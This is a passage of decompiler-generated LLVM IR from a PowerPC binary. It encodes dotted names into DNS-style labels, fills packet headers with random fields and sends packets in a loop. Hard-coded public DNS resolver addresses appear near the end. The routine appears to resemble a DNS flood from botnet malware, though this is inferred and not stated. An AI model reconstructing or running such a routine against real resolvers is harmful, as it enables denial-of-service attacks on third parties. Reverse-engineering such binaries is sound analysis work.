  %v3_10005e4c = add i32 %v2_10005e4c, 2
  %v4_10005e4c = inttoptr i32 %v3_10005e4c to i16*
  store i16 %v1_10005e4c, i16* %v4_10005e4c, align 2
  %v0_10005e50 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005e50, i32* %r3.global-to-local, align 4
  %v0_10005e54 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005e54 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e54 = add i32 %v1_10005e54, 12
  %v3_10005e54 = inttoptr i32 %v2_10005e54 to i32*
  store i32 %v0_10005e54, i32* %v3_10005e54, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v0_10005e5c = load i32, i32* %r18.global-to-local, align 4
  %v1_10005e5c = trunc i32 %v0_10005e5c to i16
  %v2_10005e5c = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e5c = add i32 %v2_10005e5c, 20
  %v4_10005e5c = inttoptr i32 %v3_10005e5c to i16*
  store i16 %v1_10005e5c, i16* %v4_10005e5c, align 2
  %v0_10005e60 = load i32, i32* %r25.global-to-local, align 4
  %v0_10005e64 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005e64 = trunc i32 %v0_10005e64 to i16
  %v2_10005e64 = load i32, i32* %r8.global-to-local, align 4
  %v3_10005e64 = add i32 %v2_10005e64, 2
  %v4_10005e64 = inttoptr i32 %v3_10005e64 to i16*
  store i16 %v1_10005e64, i16* %v4_10005e64, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10005e6c = load i32, i32* %r8.global-to-local, align 4
  %v3_10005e6c = add i32 %v2_10005e6c, 4
  %v4_10005e6c = inttoptr i32 %v3_10005e6c to i16*
  store i16 1, i16* %v4_10005e6c, align 2
  %v0_10005e70 = load i32, i32* @r28, align 4
  %v0_10005e74 = load i32, i32* @r21, align 4
  %v1_10005e74 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005e74 = add i32 %v1_10005e74, 16
  %v3_10005e74 = inttoptr i32 %v2_10005e74 to i32*
  store i32 %v0_10005e74, i32* %v3_10005e74, align 4
  %v0_10005e78 = load i32, i32* %r20.global-to-local, align 4
  %v1_10005e78 = trunc i32 %v0_10005e78 to i16
  %v2_10005e78 = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e78 = add i32 %v2_10005e78, 28
  %v4_10005e78 = inttoptr i32 %v3_10005e78 to i16*
  store i16 %v1_10005e78, i16* %v4_10005e78, align 2
  %v0_10005e7c = load i32, i32* %r23.global-to-local, align 4
  %v1_10005e7c = trunc i32 %v0_10005e7c to i8
  %v2_10005e7c = load i32, i32* %r11.global-to-local, align 4
  %v3_10005e7c = add i32 %v2_10005e7c, 40
  %v4_10005e7c = inttoptr i32 %v3_10005e7c to i8*
  store i8 %v1_10005e7c, i8* %v4_10005e7c, align 1
  store i32 268459652, i32* @lr, align 4
  %v3_10005e80 = call i32 @function_1000abe8(i32 %v0_10005e50, i32 %v0_10005e60, i32 %v0_10005e70)
  store i32 %v3_10005e80, i32* %r3.global-to-local, align 4
  %v0_10005e84 = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10005e84 = load i1, i1* %cr3_lt.global-to-local, align 1
  %v2_10005e84 = or i1 %v0_10005e84, %v1_10005e84
  br i1 %v2_10005e84, label %dec_label_pc_10005ed0, label %dec_label_pc_10005e88

dec_label_pc_10005e88:                            ; preds = %dec_label_pc_10005e2c
  %v0_10005e88 = load i32, i32* @r29, align 4
  store i32 %v0_10005e88, i32* %ctr.global-to-local, align 4
  %v0_10005e8c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005e8c, i32* %r3.global-to-local, align 4
  %v0_10005e90 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10005e90, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10005eb0

dec_label_pc_10005ea0:                            ; preds = %dec_label_pc_10005eb0
  %v1_10005ea0 = urem i32 %v1_10005eb4, 256
  br label %dec_label_pc_10005ea4

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005ec0, %dec_label_pc_10005ea0
  %v0_10005eac = phi i32 [ %v0_10005eac.pre, %dec_label_pc_10005ec0 ], [ %v0_10005eac18, %dec_label_pc_10005ea0 ]
  %v0_10005ea8 = phi i32 [ %v0_10005ec4, %dec_label_pc_10005ec0 ], [ %v0_10005ea816, %dec_label_pc_10005ea0 ]
  %v2_10005ec013 = phi i32 [ %v0_10005ec4, %dec_label_pc_10005ec0 ], [ %v2_10005ec0, %dec_label_pc_10005ea0 ]
  %v0_10005ea4 = phi i32 [ %v0_10005ea4.pre, %dec_label_pc_10005ec0 ], [ %v0_10005eb0, %dec_label_pc_10005ea0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10005ec0 ], [ %v1_10005ea0, %dec_label_pc_10005ea0 ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  %v1_10005ea4 = add i32 %v0_10005ea4, 1
  store i32 %v1_10005ea4, i32* %r10.global-to-local, align 4
  %v1_10005ea8 = add i32 %v0_10005ea8, 1
  store i32 %v1_10005ea8, i32* %r3.global-to-local, align 4
  %v1_10005eac = add i32 %v0_10005eac, -1
  store i32 %v1_10005eac, i32* %ctr.global-to-local, align 4
  %v2_10005eac = icmp eq i32 %v1_10005eac, 0
  br i1 %v2_10005eac, label %dec_label_pc_10005ed8.loopexit, label %dec_label_pc_10005eb0

dec_label_pc_10005eb0:                            ; preds = %dec_label_pc_10005ea4, %dec_label_pc_10005e88
  %v0_10005eac18 = phi i32 [ %v1_10005eac, %dec_label_pc_10005ea4 ], [ %v0_10005e88, %dec_label_pc_10005e88 ]
  %v0_10005ea816 = phi i32 [ %v1_10005ea8, %dec_label_pc_10005ea4 ], [ %v0_10005e8c, %dec_label_pc_10005e88 ]
  %v2_10005ec0 = phi i32 [ %v2_10005ec013, %dec_label_pc_10005ea4 ], [ %v0_10005e90, %dec_label_pc_10005e88 ]
  %v0_10005ec0 = phi i32 [ %storemerge, %dec_label_pc_10005ea4 ], [ 0, %dec_label_pc_10005e88 ]
  %v0_10005eb0 = phi i32 [ %v1_10005ea4, %dec_label_pc_10005ea4 ], [ 0, %dec_label_pc_10005e88 ]
  %v1_10005eb0 = load i32, i32* %r25.global-to-local, align 4
  %v2_10005eb0 = add i32 %v1_10005eb0, %v0_10005eb0
  %v3_10005eb0 = inttoptr i32 %v2_10005eb0 to i8*
  %v4_10005eb0 = load i8, i8* %v3_10005eb0, align 1
  %v5_10005eb0 = zext i8 %v4_10005eb0 to i32
  store i32 %v5_10005eb0, i32* %r0.global-to-local, align 4
  %v1_10005eb4 = add nsw i32 %v0_10005ec0, 1
  store i32 %v1_10005eb4, i32* %r11.global-to-local, align 4
  %v3_10005eb8 = icmp eq i8 %v4_10005eb0, 46
  store i1 %v3_10005eb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005eb8, label %dec_label_pc_10005ec0, label %dec_label_pc_10005ea0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005eb0
  %v1_10005ec0 = trunc i32 %v0_10005ec0 to i8
  %v3_10005ec0 = inttoptr i32 %v2_10005ec0 to i8*
  store i8 %v1_10005ec0, i8* %v3_10005ec0, align 1
  %v0_10005ec4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10005ec4, i32* %r9.global-to-local, align 4
  %v0_10005ea4.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_10005eac.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10005ea4

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005e2c
  %v0_10005ed0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10005ed0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10005ed8

dec_label_pc_10005ed8.loopexit:                   ; preds = %dec_label_pc_10005ea4
  %extract.t = trunc i32 %storemerge to i8
  br label %dec_label_pc_10005ed8

dec_label_pc_10005ed8:                            ; preds = %dec_label_pc_10005ed8.loopexit, %dec_label_pc_10005ed0
  %v2_10005ed8 = phi i32 [ %v2_10005ec013, %dec_label_pc_10005ed8.loopexit ], [ %v0_10005ed0, %dec_label_pc_10005ed0 ]
  %v0_10005ed8.off0 = phi i8 [ %extract.t, %dec_label_pc_10005ed8.loopexit ], [ 0, %dec_label_pc_10005ed0 ]
  %v3_10005ed8 = inttoptr i32 %v2_10005ed8 to i8*
  store i8 %v0_10005ed8.off0, i8* %v3_10005ed8, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10005ee0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10005ee0 = load i32, i32* @r29, align 4
  %v2_10005ee0 = add i32 %v1_10005ee0, %v0_10005ee0
  store i32 %v2_10005ee0, i32* %r9.global-to-local, align 4
  %v3_10005ee4 = load i32, i32* %stack_var_-2184, align 4
  store i32 %v3_10005ee4, i32* %r11.global-to-local, align 4
  %v3_10005ee8 = add i32 %v2_10005ee0, 4
  %v4_10005ee8 = inttoptr i32 %v3_10005ee8 to i16*
  store i16 1, i16* %v4_10005ee8, align 2
  %v0_10005eec = load i32, i32* %r11.global-to-local, align 4
  %v1_10005eec = add i32 %v0_10005eec, 1
  store i32 %v1_10005eec, i32* %r31.global-to-local, align 4
  %v0_10005ef0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005ef0 = trunc i32 %v0_10005ef0 to i16
  %v2_10005ef0 = load i32, i32* %r9.global-to-local, align 4
  %v3_10005ef0 = add i32 %v2_10005ef0, 2
  %v4_10005ef0 = inttoptr i32 %v3_10005ef0 to i16*
  store i16 %v1_10005ef0, i16* %v4_10005ef0, align 2
  %v0_10005ef4 = load i32, i32* %r31.global-to-local, align 4
  %v1_10005ef4 = load i32, i32* %r15.global-to-local, align 4
  %v2_10005ef4 = icmp slt i32 %v0_10005ef4, %v1_10005ef4
  %v4_10005ef4 = icmp eq i32 %v0_10005ef4, %v1_10005ef4
  store i1 %v4_10005ef4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10005ef4, i32* %stack_var_-2184, align 4
  br i1 %v2_10005ef4, label %dec_label_pc_10005dc8, label %dec_label_pc_10005f00.preheader.loopexit

dec_label_pc_10005f00.preheader.loopexit:         ; preds = %dec_label_pc_10005ed8
  %v0_10005f00.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10005f00.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_10005f00.preheader

dec_label_pc_10005f00.preheader:                  ; preds = %dec_label_pc_10005ff8, %dec_label_pc_10005d7c, %dec_label_pc_10005f00.preheader.loopexit
  %v1_10005f00 = phi i1 [ %v1_10005d7c, %dec_label_pc_10005d7c ], [ %v1_10005f00.pre, %dec_label_pc_10005f00.preheader.loopexit ], [ %v1_10005ff8, %dec_label_pc_10005ff8 ]
  %v0_10005f00 = phi i1 [ %v3_10005d7c, %dec_label_pc_10005d7c ], [ %v0_10005f00.pre, %dec_label_pc_10005f00.preheader.loopexit ], [ %v0_10005ff8, %dec_label_pc_10005ff8 ]
  %v2_10005f00 = or i1 %v1_10005f00, %v0_10005f00
  br label %dec_label_pc_10005f00

dec_label_pc_10005f00:                            ; preds = %dec_label_pc_10005f00.preheader, %dec_label_pc_10005f00
  br i1 %v2_10005f00, label %dec_label_pc_10005f00, label %dec_label_pc_10005f04

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005f00, %dec_label_pc_10005ff8
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2184, align 4
  %v0_10005f14 = load i32, i32* %r19.global-to-local, align 4
  %v4_10005f14 = icmp eq i32 %v0_10005f14, 65535
  store i1 %v4_10005f14, i1* %cr7_eq.global-to-local, align 1
  %v0_10005f18 = load i32, i32* %r18.global-to-local, align 4
  %v2_10005f18 = icmp slt i32 %v0_10005f18, 65535
  %v4_10005f18 = icmp eq i32 %v0_10005f18, 65535
  store i1 %v2_10005f18, i1* %cr3_lt.global-to-local, align 1
  store i1 %v4_10005f18, i1* %cr3_eq.global-to-local, align 1
  %v0_10005f1c = load i32, i32* %r20.global-to-local, align 4
  %v4_10005f1c = icmp eq i32 %v0_10005f1c, 65535
  store i1 %v4_10005f1c, i1* %cr2_eq.global-to-local, align 1
  %v0_10005f20 = load i32, i32* @r24, align 4
  %v1_10005f20 = add i32 %v0_10005f20, 27
  store i32 %v1_10005f20, i32* @r30, align 4
  %v0_10005f24 = call i32 @__asm_mfcr()
  store i32 %v0_10005f24, i32* %r3.global-to-local, align 4
  %v1_10005f28 = mul i32 %v0_10005f24, 268435456
  store i32 %v1_10005f28, i32* @r26, align 4
  %v0_10005f2c = load i32, i32* %r17.global-to-local, align 4
  %v1_10005f2c = load i32, i32* %r0.global-to-local, align 4
  %v4_10005f2c = icmp eq i32 %v0_10005f2c, %v1_10005f2c
  store i1 %v4_10005f2c, i1* %cr7_eq.global-to-local, align 1
  %v0_10005f30 = load i32, i32* @r24, align 4
  %v1_10005f30 = add i32 %v0_10005f30, 47
  store i32 %v1_10005f30, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10005f38 = call i32 @__asm_mfcr()
  store i32 %v0_10005f38, i32* %r3.global-to-local, align 4
  %v1_10005f3c = mul i32 %v0_10005f38, 268435456
  store i32 %v1_10005f3c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r25, align 4
  %v0_10005f44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005f44

dec_label_pc_10005f44:                            ; preds = %dec_label_pc_10005f78.dec_label_pc_10005f44_crit_edge, %dec_label_pc_10005f04
  %v0_10005f48 = phi i32 [ %v0_10005f48.pre, %dec_label_pc_10005f78.dec_label_pc_10005f44_crit_edge ], [ %v1_10005f3c, %dec_label_pc_10005f04 ]
  %v0_10005f44 = phi i32 [ %v1_10005fe8, %dec_label_pc_10005f78.dec_label_pc_10005f44_crit_edge ], [ %v0_10005f44.pre, %dec_label_pc_10005f04 ]
  %v1_10005f44 = mul i32 %v0_10005f44, 4
  store i32 %v1_10005f44, i32* %r0.global-to-local, align 4
  %v1_10005f48 = mul i32 %v0_10005f48, 16
  %v2_10005f48 = udiv i32 %v0_10005f48, 268435456
  %v3_10005f48 = or i32 %v2_10005f48, %v1_10005f48
  store i32 %v3_10005f48, i32* %r27.global-to-local, align 4
  %v1_10005f4c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10005f48)
  %v1_10005f50 = mul nuw i32 %v2_10005f48, 268435456
  %v2_10005f50 = urem i32 %v0_10005f48, 268435456
  %v3_10005f50 = or i32 %v1_10005f50, %v2_10005f50
  store i32 %v3_10005f50, i32* @r27, align 4
  %v0_10005f54 = load i32, i32* %r16.global-to-local, align 4
  %v1_10005f54 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005f54 = add i32 %v1_10005f54, %v0_10005f54
  %v3_10005f54 = inttoptr i32 %v2_10005f54 to i32*
  %v4_10005f54 = load i32, i32* %v3_10005f54, align 4
  store i32 %v4_10005f54, i32* @r29, align 4
  %v1_10005f58 = add i32 %v4_10005f54, 20
  store i32 %v1_10005f58, i32* @r28, align 4
  %v0_10005f5c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10005f5c, label %dec_label_pc_10006000, label %dec_label_pc_10005f60

dec_label_pc_10005f60:                            ; preds = %dec_label_pc_10005f44
  %v0_10005f60 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005f60, label %dec_label_pc_1000600c, label %dec_label_pc_10005f64

dec_label_pc_10005f64:                            ; preds = %dec_label_pc_10006000, %dec_label_pc_10005f60
  %v0_10005f64 = load i32, i32* @r26, align 4
  %v1_10005f64 = mul i32 %v0_10005f64, 16
  %v2_10005f64 = udiv i32 %v0_10005f64, 268435456
  %v3_10005f64 = or i32 %v2_10005f64, %v1_10005f64
  store i32 %v3_10005f64, i32* %r26.global-to-local, align 4
  %v1_10005f68 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10005f64)
  %v1_10005f6c = mul nuw i32 %v2_10005f64, 268435456
  %v2_10005f6c = urem i32 %v0_10005f64, 268435456
  %v3_10005f6c = or i32 %v1_10005f6c, %v2_10005f6c
  store i32 %v3_10005f6c, i32* @r26, align 4
  %v0_10005f70 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10005f70, label %dec_label_pc_10006024, label %dec_label_pc_10005f74

dec_label_pc_10005f74:                            ; preds = %dec_label_pc_1000600c, %dec_label_pc_10005f64
  %v0_10005f74 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10005f74, label %dec_label_pc_10006030, label %dec_label_pc_10005f78

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10006024, %dec_label_pc_10005f74, %dec_label_pc_10006030
  %v0_10005f78 = load i32, i32* @r29, align 4
  %v1_10005f78 = add i32 %v0_10005f78, 41
  store i32 %v1_10005f78, i32* %r3.global-to-local, align 4
  %v0_10005f7c = load i32, i32* %r23.global-to-local, align 4
  store i32 268459908, i32* @lr, align 4
  %v2_10005f80 = inttoptr i32 %v1_10005f78 to i8*
  %v3_10005f80 = call i32 @function_10007d68(i8* %v2_10005f80, i32 %v0_10005f7c)
  %v0_10005f84 = load i32, i32* @r25, align 4
  %v1_10005f84 = trunc i32 %v0_10005f84 to i16
  %v2_10005f84 = load i32, i32* @r29, align 4
  %v3_10005f84 = add i32 %v2_10005f84, 10
  %v4_10005f84 = inttoptr i32 %v3_10005f84 to i16*
  store i16 %v1_10005f84, i16* %v4_10005f84, align 2
  %v0_10005f8c = load i32, i32* @r29, align 4
  store i32 %v0_10005f8c, i32* @r3, align 4
  %v2_10005f90 = call i32 @function_100060d4(i32 %v0_10005f8c, i32 20)
  %v3_10005f90 = trunc i32 %v2_10005f90 to i16
  %v0_10005f94 = load i32, i32* @r28, align 4
  store i32 %v0_10005f94, i32* @r4, align 4
  %v3_10005f98 = load i32, i32* @r29, align 4
  %v4_10005f98 = add i32 %v3_10005f98, 10
  %v5_10005f98 = inttoptr i32 %v4_10005f98 to i16*
  store i16 %v3_10005f90, i16* %v5_10005f98, align 2
  %v0_10005f9c = load i32, i32* @r30, align 4
  %v0_10005fa0 = load i32, i32* @r25, align 4
  %v1_10005fa0 = trunc i32 %v0_10005fa0 to i16
  %v2_10005fa0 = load i32, i32* @r28, align 4
  %v3_10005fa0 = add i32 %v2_10005fa0, 6
  %v4_10005fa0 = inttoptr i32 %v3_10005fa0 to i16*
  store i16 %v1_10005fa0, i16* %v4_10005fa0, align 2
  %v0_10005fa4 = load i32, i32* @r29, align 4
  store i32 %v0_10005fa4, i32* %r3.global-to-local, align 4
  %v0_10005fa8 = load i32, i32* @r28, align 4
  %v1_10005fa8 = add i32 %v0_10005fa8, 4
  %v2_10005fa8 = inttoptr i32 %v1_10005fa8 to i16*
  %v3_10005fa8 = load i16, i16* %v2_10005fa8, align 2
  %v4_10005fa8 = zext i16 %v3_10005fa8 to i32
  %v4_10005fac = call i32 @function_10006138(i32 %v0_10005fa4, i32 %v0_10005f94, i32 %v4_10005fa8, i32 %v0_10005f9c)
  %v5_10005fac = trunc i32 %v4_10005fac to i16
  store i32 %v4_10005fac, i32* %r3.global-to-local, align 4
  %v3_10005fb0 = load i32, i32* %stack_var_-2184, align 4
  store i32 %v3_10005fb0, i32* %r7.global-to-local, align 4
  %v0_10005fb4 = load i32, i32* @r28, align 4
  %v1_10005fb4 = add i32 %v0_10005fb4, 2
  %v2_10005fb4 = inttoptr i32 %v1_10005fb4 to i16*
  %v3_10005fb4 = load i16, i16* %v2_10005fb4, align 2
  %v4_10005fb4 = zext i16 %v3_10005fb4 to i32
  store i32 %v4_10005fb4, i32* %r0.global-to-local, align 4
  %v0_10005fb8 = load i32, i32* @r29, align 4
  %v1_10005fbc = mul i32 %v3_10005fb0, 24
  store i32 %v1_10005fbc, i32* %r7.global-to-local, align 4
  %v4_10005fc0 = add i32 %v0_10005fb4, 6
  %v5_10005fc0 = inttoptr i32 %v4_10005fc0 to i16*
  store i16 %v5_10005fac, i16* %v5_10005fc0, align 2
  %v0_10005fc4 = load i32, i32* @r31, align 4
  %v0_10005fc8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10005fc8, i32* %r3.global-to-local, align 4
  %v0_10005fcc = load i32, i32* %r7.global-to-local, align 4
  %v1_10005fcc = load i32, i32* %r14.global-to-local, align 4
  %v2_10005fcc = add i32 %v1_10005fcc, %v0_10005fcc
  store i32 %v2_10005fcc, i32* %r7.global-to-local, align 4
  %v0_10005fd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005fd4 = trunc i32 %v0_10005fd4 to i16
  %v3_10005fd4 = add i32 %v2_10005fcc, 2
  %v4_10005fd4 = inttoptr i32 %v3_10005fd4 to i16*
  store i16 %v1_10005fd4, i16* %v4_10005fd4, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  %v0_10005fdc = load i32, i32* @r21, align 4
  %v2_10005fdc = add i32 %v2_10005fcc, 4
  %v3_10005fdc = inttoptr i32 %v2_10005fdc to i32*
  store i32 %v0_10005fdc, i32* %v3_10005fdc, align 4
  store i32 268460004, i32* @lr, align 4
  %v6_10005fe0 = call i32 @function_1000c140(i32 %v0_10005fc8, i32 %v0_10005fb8, i32 %v0_10005fc4, i32 16384, i32 %v2_10005fcc, i32 16)
  store i32 %v6_10005fe0, i32* %r3.global-to-local, align 4
  %v3_10005fe4 = load i32, i32* %stack_var_-2184, align 4
  store i32 %v3_10005fe4, i32* %r9.global-to-local, align 4
  %v1_10005fe8 = add i32 %v3_10005fe4, 1
  store i32 %v1_10005fe8, i32* %r0.global-to-local, align 4
  %v1_10005fec = load i32, i32* %r15.global-to-local, align 4
  %v2_10005fec = icmp slt i32 %v1_10005fe8, %v1_10005fec
  %v4_10005fec = icmp eq i32 %v1_10005fe8, %v1_10005fec
  store i1 %v4_10005fec, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10005fe8, i32* %stack_var_-2184, align 4
  br i1 %v2_10005fec, label %dec_label_pc_10005f78.dec_label_pc_10005f44_crit_edge, label %dec_label_pc_10005ff8

dec_label_pc_10005f78.dec_label_pc_10005f44_crit_edge: ; preds = %dec_label_pc_10005f78
  %v0_10005f48.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005f44

dec_label_pc_10005ff8:                            ; preds = %dec_label_pc_10005f78
  %v0_10005ff8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10005ff8 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10005ff8 = or i1 %v0_10005ff8, %v1_10005ff8
  br i1 %v2_10005ff8, label %dec_label_pc_10005f00.preheader, label %dec_label_pc_10005f04

dec_label_pc_10006000:                            ; preds = %dec_label_pc_10005f44
  %v0_10006000 = call i32 @function_10007ca8()
  %v1_10006000 = trunc i32 %v0_10006000 to i16
  store i32 %v0_10006000, i32* %r3.global-to-local, align 4
  %v3_10006004 = load i32, i32* @r29, align 4
  %v4_10006004 = add i32 %v3_10006004, 4
  %v5_10006004 = inttoptr i32 %v4_10006004 to i16*
  store i16 %v1_10006000, i16* %v5_10006004, align 2
  %v0_10006008 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10006008, label %dec_label_pc_1000600c, label %dec_label_pc_10005f64

dec_label_pc_1000600c:                            ; preds = %dec_label_pc_10006000, %dec_label_pc_10005f60
  %v0_1000600c = call i32 @function_10007ca8()
  %v1_1000600c = trunc i32 %v0_1000600c to i16
  store i32 %v0_1000600c, i32* %r3.global-to-local, align 4
  %v0_10006010 = load i32, i32* @r26, align 4
  %v1_10006010 = mul i32 %v0_10006010, 16
  %v2_10006010 = udiv i32 %v0_10006010, 268435456
  %v3_10006010 = or i32 %v2_10006010, %v1_10006010
  store i32 %v3_10006010, i32* %r26.global-to-local, align 4
  %v1_10006014 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10006010)
  %v1_10006018 = mul nuw i32 %v2_10006010, 268435456
  %v2_10006018 = urem i32 %v0_10006010, 268435456
  %v3_10006018 = or i32 %v1_10006018, %v2_10006018
  store i32 %v3_10006018, i32* @r26, align 4
  %v3_1000601c = load i32, i32* @r29, align 4
  %v4_1000601c = add i32 %v3_1000601c, 20
  %v5_1000601c = inttoptr i32 %v4_1000601c to i16*
  store i16 %v1_1000600c, i16* %v5_1000601c, align 2
  %v0_10006020 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006020, label %dec_label_pc_10006024, label %dec_label_pc_10005f74

dec_label_pc_10006024:                            ; preds = %dec_label_pc_1000600c, %dec_label_pc_10005f64
  %v0_10006024 = call i32 @function_10007ca8()
  %v1_10006024 = trunc i32 %v0_10006024 to i16
  store i32 %v0_10006024, i32* %r3.global-to-local, align 4
  %v3_10006028 = load i32, i32* @r28, align 4
  %v4_10006028 = add i32 %v3_10006028, 2
  %v5_10006028 = inttoptr i32 %v4_10006028 to i16*
  store i16 %v1_10006024, i16* %v5_10006028, align 2
  %v0_1000602c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_1000602c, label %dec_label_pc_10006030, label %dec_label_pc_10005f78

dec_label_pc_10006030:                            ; preds = %dec_label_pc_10006024, %dec_label_pc_10005f74
  %v0_10006030 = call i32 @function_10007ca8()
  %v1_10006030 = trunc i32 %v0_10006030 to i16
  store i32 %v0_10006030, i32* %r3.global-to-local, align 4
  %v3_10006034 = load i32, i32* @r29, align 4
  %v4_10006034 = add i32 %v3_10006034, 28
  %v5_10006034 = inttoptr i32 %v4_10006034 to i16*
  store i16 %v1_10006030, i16* %v5_10006034, align 2
  br label %dec_label_pc_10005f78

dec_label_pc_10006048:                            ; preds = %dec_label_pc_10005d58
  %v0_10006048 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10006048, i32* %r3.global-to-local, align 4
  store i32 268460112, i32* @lr, align 4
  %v0_1000604c = call i32 @function_1000b3f0()
  store i32 %v0_1000604c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006050

dec_label_pc_10006050:                            ; preds = %dec_label_pc_10005d30, %dec_label_pc_10005d28, %dec_label_pc_10006048
  store i32 %v0_10005a7c, i32* %r0.global-to-local, align 4
  %v1_10006064 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10005a6c)
  store i32 %v0_10005a9c, i32* %r24.global-to-local, align 4
  store i32 %v0_10005aa0, i32* %r25.global-to-local, align 4
  store i32 %v0_10005aa4, i32* %r26.global-to-local, align 4
  store i32 %v0_10005aa8, i32* %r27.global-to-local, align 4
  store i32 %v0_10005aac, i32* %r28.global-to-local, align 4
  store i32 %v0_10005ad0, i32* %r30.global-to-local, align 4
  store i32 %v0_10005abc, i32* %r31.global-to-local, align 4
  %v0_100060ac = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100060ac

dec_label_pc_100060b0:                            ; preds = %dec_label_pc_10005cc4
  store i32 1246898730, i32* @r21, align 4
  br label %dec_label_pc_10005d28

dec_label_pc_100060bc:                            ; preds = %dec_label_pc_10005cdc
  store i32 1074151430, i32* @r21, align 4
  br label %dec_label_pc_10005d28

dec_label_pc_100060c8:                            ; preds = %dec_label_pc_10005cd4
  store i32 134744072, i32* @r21, align 4
  br label %dec_label_pc_10005d28

; uselistorder directives
  uselistorder i32 %v0_10006030, { 1, 0 }
  uselistorder i32 %v0_10006024, { 1, 0 }
  uselistorder i32 %v0_10006010, { 2, 1, 0 }
  uselistorder i32 %v0_1000600c, { 1, 0 }
  uselistorder i32 %v0_10006000, { 1, 0 }
  uselistorder i1 %v1_10005ff8, { 1, 0 }
  uselistorder i1 %v0_10005ff8, { 1, 0 }
  uselistorder i32 %v1_10005fe8, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_10005fac, { 1, 0 }
  uselistorder i32 %v0_10005f64, { 2, 1, 0 }
  uselistorder i32 %v0_10005f48, { 2, 1, 0 }
  uselistorder i32 %v1_10005f3c, { 1, 0 }
  uselistorder i32 %v0_10005ec4, { 2, 0, 1 }
  uselistorder i32 %v1_10005eb4, { 1, 0 }
  uselistorder i32 %v1_10005eac, { 0, 2, 1 }
  uselistorder i32 %v1_10005de0, { 1, 0 }
  uselistorder i32 %v1_10005dd8, { 1, 0 }
  uselistorder i32 %v2_1000603c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1000603c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10005d98, { 1, 0 }
  uselistorder i32 %v0_10005d28, { 1, 0, 2 }
  uselistorder i1 %v2_10005cdc, { 1, 0 }
  uselistorder i32 %v1_10005cc8, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_10005cc0, { 2, 1, 0 }
  uselistorder i32 %v1_10005ca8, { 1, 2, 0 }
  uselistorder i32 %v1_10005c84, { 1, 0 }
  uselistorder i32 %v0_10005c78, { 1, 0 }
  uselistorder i32 %v2_10005c74, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_10005c54, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10005c4c, { 1, 2, 0, 3, 5, 4, 6 }
  uselistorder i32 %v0_10005bf4, { 1, 0, 2, 3 }
  uselistorder i8 %v5_10005b34, { 1, 0 }
  uselistorder i8 %v5_10005afc, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
